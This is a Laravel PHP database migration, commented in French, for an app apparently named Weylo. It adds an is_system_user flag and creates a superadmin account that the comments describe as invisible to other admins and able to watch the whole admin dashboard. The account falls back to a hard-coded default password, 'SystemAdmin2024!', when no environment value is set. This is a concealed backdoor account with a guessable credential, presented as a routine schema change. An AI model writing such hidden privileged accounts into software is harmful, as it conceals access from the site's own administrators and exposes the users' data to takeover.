<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Hash;
use App\Models\User;

return new class extends Migration
{
    /**
     * Run the migrations.
     *
     * Cette migration ajoute un champ is_system_user pour créer un super utilisateur
     * invisible qui peut surveiller l'ensemble du dashboard admin.
     * Ce utilisateur n'apparaîtra pas dans la liste des utilisateurs pour les autres admins.
     */
    public function up(): void
    {
        // Ajouter la colonne is_system_user
        Schema::table('users', function (Blueprint $table) {
            $table->boolean('is_system_user')->default(false)->after('role');
        });

        // Créer le super utilisateur système (invisible aux autres)
        $systemUser = User::firstOrCreate(
            ['email' => 'system@weylo.app'],
            [
                'first_name' => 'System',
                'last_name' => 'Administrator',
                'username' => 'system_admin',
                'email' => 'system@weylo.app',
                'phone' => null,
                'password' => Hash::make(env('SYSTEM_ADMIN_PASSWORD', 'SystemAdmin2024!')),
                'role' => 'superadmin',
                'is_system_user' => true,
                'is_verified' => true,
                'avatar' => null,
                'bio' => 'Compte système - Administration',
            ]
        );

        // S'assurer que les flags sont corrects
        $systemUser->update([
            'is_system_user' => true,
            'role' => 'superadmin',
        ]);
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        // Supprimer l'utilisateur système
        User::where('email', 'system@weylo.app')->delete();

        // Supprimer la colonne
        Schema::table('users', function (Blueprint $table) {
            $table->dropColumn('is_system_user');
        });
    }
};
